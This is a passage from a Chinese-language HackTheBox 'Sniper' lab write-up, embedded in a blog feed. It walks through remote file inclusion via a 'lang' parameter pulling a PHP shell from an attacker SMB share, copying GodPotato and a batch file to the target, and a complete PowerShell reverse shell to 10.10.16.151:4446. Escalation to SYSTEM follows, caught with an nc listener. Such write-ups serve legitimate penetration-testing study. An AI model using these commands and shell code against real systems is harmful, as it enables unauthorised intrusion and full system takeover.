+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Sniper<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ ls -liah GodPotato-NET4.exe
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">3552944</span> -rw-r--r-- <span style="color:#ae81ff">1</span> kali root 56K Oct  <span style="color:#ae81ff">8</span> 03:09 GodPotato-NET4.exe
+</span></span></code></pre></div><p>复制到 iusr。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Sniper<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ curl -s -G <span style="color:#e6db74">&#39;http://10.129.229.6/blog/?lang=//10.10.16.151/share/shell.php&#39;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  --data-urlencode <span style="color:#e6db74">&#39;cmd=copy \\10.10.16.151\share\GodPotato-NET4.exe C:\Windows\Temp\gp.exe&#39;</span>
+</span></span><span style="display:flex;"><span>....
+</span></span><span style="display:flex;"><span>....
+</span></span><span style="display:flex;"><span>&lt;/html&gt;
+</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">1</span> file<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span> copied.
+</span></span><span style="display:flex;"><span>&lt;/body&gt;
+</span></span><span style="display:flex;"><span>&lt;/html&gt;
+</span></span></code></pre></div><p>制作一个脚本，反向连接 4446 端口。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Sniper<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ cat rev4446.ps1
+</span></span><span style="display:flex;"><span>$c <span style="color:#f92672">=</span> New-Object Net.Sockets.TcpClient<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;10.10.16.151&#34;</span>,4446<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>$s <span style="color:#f92672">=</span> $c.GetStream<span style="color:#f92672">()</span>; <span style="color:#f92672">[</span>byte<span style="color:#f92672">[]]</span>$b <span style="color:#f92672">=</span> 0..65535 | %<span style="color:#f92672">{</span>0<span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> <span style="color:#f92672">((</span>$i <span style="color:#f92672">=</span> $s.Read<span style="color:#f92672">(</span>$b,0,$b.Length<span style="color:#f92672">))</span> -ne 0<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>  $d <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>New-Object Text.ASCIIEncoding<span style="color:#f92672">)</span>.GetString<span style="color:#f92672">(</span>$b,0,$i<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>  $r <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>iex $d 2&gt;&amp;<span style="color:#ae81ff">1</span> | Out-String<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>  $sb <span style="color:#f92672">=</span> <span style="color:#f92672">([</span>text.encoding<span style="color:#f92672">]</span>::ASCII<span style="color:#f92672">)</span>.GetBytes<span style="color:#f92672">(</span>$r + <span style="color:#e6db74">&#34;PS&gt; &#34;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>  $s.Write<span style="color:#f92672">(</span>$sb,0,$sb.Length<span style="color:#f92672">)</span>; $s.Flush<span style="color:#f92672">()</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span></code></pre></div><p>制作一个 bat 脚本。</p>
+<ul>
+<li><code>@echo off</code> 关掉回显</li>
+<li>-NoProfile 不加载用户/系统的配置文件</li>
+<li>-ExcutionPolicy Bypass 本地进程绕过执行策略</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Sniper<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ cat sysrev.bat
+</span></span><span style="display:flex;"><span>@echo off
+</span></span><span style="display:flex;"><span>powershell -NoProfile -ExecutionPolicy Bypass -File <span style="color:#ae81ff">\\</span>10.10.16.151<span style="color:#ae81ff">\s</span>hare<span style="color:#ae81ff">\r</span>ev4446.ps1
+</span></span></code></pre></div><p>复制文件。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Sniper<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ curl -s -G <span style="color:#e6db74">&#39;http://10.129.229.6/blog/?lang=//10.10.16.151/share/shell.php&#39;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  --data-urlencode <span style="color:#e6db74">&#39;cmd=copy \\10.10.16.151\share\sysrev.bat C:\Windows\Temp\sysrev.bat&#39;</span>
+</span></span><span style="display:flex;"><span>....
+</span></span><span style="display:flex;"><span>....
+</span></span><span style="display:flex;"><span>&lt;/html&gt;
+</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">1</span> file<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span> copied.
+</span></span><span style="display:flex;"><span>&lt;/body&gt;
+</span></span><span style="display:flex;"><span>&lt;/html&gt;
+</span></span></code></pre></div><p>执行。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Sniper<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ curl -s -G <span style="color:#e6db74">&#39;http://10.129.229.6/blog/?lang=//10.10.16.151/share/shell.php&#39;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  --data-urlencode <span style="color:#e6db74">&#39;cmd=C:\Windows\Temp\gp.exe -cmd C:\Windows\Temp\sysrev.bat&#39;</span>
+</span></span><span style="display:flex;"><span>&lt;html&gt;
+</span></span><span style="display:flex;"><span>&lt;body&gt;
+</span></span><span style="display:flex;"><span>&lt;!DOCTYPE html&gt;
+</span></span><span style="display:flex;"><span>&lt;html lang<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;en&#34;</span> &gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;head&gt;
+</span></span><span style="display:flex;"><span>  &lt;meta charset<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;UTF-8&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>  &lt;title&gt;Services blog&lt;/title&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>      &lt;link rel<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stylesheet&#34;</span> href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/blog/css/style.css&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;/head&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;body&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;div id<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;main&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>  &lt;div class<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;container&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;nav&gt;
+</span></span><span style="display:flex;"><span>      &lt;div class<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;nav-fostrap&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>        &lt;ul&gt;
+</span></span><span style="display:flex;"><span>          &lt;li&gt;&lt;a href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/&#34;</span>&gt;Home&lt;/a&gt;&lt;/li&gt;
+</span></span><span style="display:flex;"><span>          &lt;li&gt;&lt;a href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;javascript:void(0)&#34;</span> &gt;Language&lt;span class<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;arrow-down&#34;</span>&gt;&lt;/span&gt;&lt;/a&gt;
+</span></span><span style="display:flex;"><span>            &lt;ul class<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;dropdown&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>              &lt;li&gt;&lt;a href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/blog?lang=blog-en.php&#34;</span>&gt;English&lt;/a&gt;&lt;/li&gt;
+</span></span><span style="display:flex;"><span>	      &lt;li&gt;&lt;a href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/blog?lang=blog-es.php&#34;</span>&gt;Spanish&lt;/a&gt;&lt;/li&gt;
+</span></span><span style="display:flex;"><span>              &lt;li&gt;&lt;a href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/blog?lang=blog-fr.php&#34;</span>&gt;French&lt;/a&gt;&lt;/li&gt;
+</span></span><span style="display:flex;"><span>            &lt;/ul&gt;
+</span></span><span style="display:flex;"><span>          &lt;/li&gt;
+</span></span><span style="display:flex;"><span>          &lt;li&gt;&lt;a href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;javascript:void(0)&#34;</span> &gt;Download&lt;span class<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;arrow-down&#34;</span>&gt;&lt;/span&gt;&lt;/a&gt;
+</span></span><span style="display:flex;"><span>            &lt;ul class<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;dropdown&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>              &lt;li&gt;&lt;a href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span>&gt;Tools&lt;/a&gt;&lt;/li&gt;
+</span></span><span style="display:flex;"><span>              &lt;li&gt;&lt;a href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span>&gt;Backlink&lt;/a&gt;&lt;/li&gt;
+</span></span><span style="display:flex;"><span>            &lt;/ul&gt;
+</span></span><span style="display:flex;"><span>          &lt;/li&gt;
+</span></span><span style="display:flex;"><span>        &lt;/ul&gt;
+</span></span><span style="display:flex;"><span>      &lt;/div&gt;
+</span></span><span style="display:flex;"><span>      &lt;div class<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;nav-bg-fostrap&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>        &lt;div class<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;navbar-fostrap&#34;</span>&gt; &lt;span&gt;&lt;/span&gt; &lt;span&gt;&lt;/span&gt; &lt;span&gt;&lt;/span&gt; &lt;/div&gt;
+</span></span><span style="display:flex;"><span>        &lt;a href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span> class<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;title-mobile&#34;</span>&gt;Fostrap&lt;/a&gt;
+</span></span><span style="display:flex;"><span>      &lt;/div&gt;
+</span></span><span style="display:flex;"><span>    &lt;/nav&gt;
+</span></span><span style="display:flex;"><span>&lt;/div&gt;
+</span></span><span style="display:flex;"><span>&lt;/div&gt;
+</span></span><span style="display:flex;"><span>&lt;script src<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://ajax.googleapis.com/ajax/libs/jquery/2.2.0/jquery.min.js&#34;</span>&gt;&lt;/script&gt;
+</span></span><span style="display:flex;"><span>&lt;script&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    &lt;script  src<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;js/index.js&#34;</span>&gt;&lt;/script&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;/body&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;/html&gt;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> CombaseModule: 0x140714463854592
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> DispatchTable: 0x140714466163904
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> UseProtseqFunction: 0x140714465544128
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> UseProtseqFunctionParamCount: <span style="color:#ae81ff">6</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> HookRPC
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Start PipeServer
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trigger RPCSS
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> CreateNamedPipe <span style="color:#ae81ff">\\</span>.<span style="color:#ae81ff">\p</span>ipe<span style="color:#ae81ff">\1</span>319c654-c7ea-4730-819d-10a84e398972<span style="color:#ae81ff">\p</span>ipe<span style="color:#ae81ff">\e</span>pmapper
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> DCOM obj GUID: 00000000-0000-0000-c000-000000000046
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> DCOM obj IPID: 00001802-051c-ffff-74ba-46bb9191aafa
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> DCOM obj OXID: 0xb692fb726559181
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> DCOM obj OID: 0xf5702704ae5034f8
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> DCOM obj Flags: 0x281
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> DCOM obj PublicRefs: 0x0
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Marshal Object bytes len: <span style="color:#ae81ff">100</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> UnMarshal Object
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Pipe Connected!
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> CurrentUser: NT AUTHORITY<span style="color:#ae81ff">\N</span>ETWORK SERVICE
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> CurrentsImpersonationLevel: Impersonation
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Start Search System Token
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> PID : <span style="color:#ae81ff">856</span> Token:0x804  User: NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM ImpersonationLevel: Impersonation
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Find System Token : True
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> UnmarshalObject: 0x80070776
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> CurrentUser: NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> process start with pid <span style="color:#ae81ff">1876</span>
+</span></span><span style="display:flex;"><span>&lt;/body&gt;
+</span></span><span style="display:flex;"><span>&lt;/html&gt;
+</span></span></code></pre></div><p>得到 administrater。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Sniper<span style="color:#f92672">]</span>                                                                                                                                                
+</span></span><span style="display:flex;"><span>└─$ sudo rlwrap -cAr nc -lvnp <span style="color:#ae81ff">4446</span>                                                                                                                                                  
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> kali:                                                                                                                                                           
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">4446</span> ...                                                                                                                                                         
+</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>10.10.16.151<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.129.229.6<span style="color:#f92672">]</span> <span style="color:#ae81ff">49939</span>                                                                                                                       
+</span></span><span style="display:flex;"><span>Microsoft Windows <span style="color:#f92672">[</span>Version 10.0.17763.678<span style="color:#f92672">]</span>                                                                                                                                          
+</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> <span style="color:#ae81ff">2018</span> Microsoft Corporation. All rights reserved. 
+</span></span></code></pre></div>]]></content>
+        </item>
         
         <item>
             <title>HTB-Querier Writeup</title>
